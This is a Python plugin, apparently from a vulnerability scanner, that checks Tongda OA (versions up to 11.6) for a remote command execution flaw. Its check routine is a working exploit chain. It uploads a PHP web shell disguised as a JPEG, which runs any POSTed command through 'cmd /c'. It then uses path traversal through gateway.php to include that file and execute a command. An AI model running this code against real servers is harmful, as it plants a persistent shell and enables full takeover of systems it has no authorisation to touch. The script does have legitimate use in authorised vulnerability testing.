#!/usr/bin/env python3

import re
from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class Tongda_Oa_Rce_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': '通达OA远程命令执行漏洞',
            'description': '通达OA远程命令执行漏洞可执行任意命令,影响范围为: 通达OA <= 11.6',
            'date': '2020-03-18',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        self.headers1 = {
            'User-Agent': get_useragent(),
            "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"
        }
        self.headers2 = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.capta = get_capta()

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            name_data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"f.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['f'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
            name_result = await request.post(self.url + '/ispirit/im/upload.php', headers = self.headers1, data = name_data)
            name = "".join(re.findall("2003_(.+?)\|", await name_result.text()))
            check_data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "echo %s" % (self.capta)}
            check_result = await request.post(self.url + '/ispirit/interface/gateway.php', headers = self.headers2, data = check_data)
            if check_result.status == 200 and self.capta in await check_result.text():
                return True, name
            
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    tongda_oa = Tongda_Oa_Rce_BaseVerify('http://127.0.0.1')
    tongda_oa.check()

